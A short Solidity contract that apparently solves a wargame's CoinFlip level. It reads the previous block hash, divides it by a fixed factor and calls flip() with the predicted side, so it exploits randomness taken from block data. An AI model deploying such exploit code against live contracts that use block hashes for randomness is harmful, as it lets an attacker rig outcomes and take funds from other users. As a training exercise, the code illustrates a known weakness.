pragma solidity ^0.4.18;

import './CoinFlip.sol';

contract HackFlipCoin {
    CoinFlip private instance;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 lastHash;
    
    function hackCoin(address _address) public {
        instance = CoinFlip(_address);
    }
    
    function hack() public {
        uint256 blockValue = uint256(block.blockhash(block.number-1));
        
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        
        instance.flip(side);
    }
}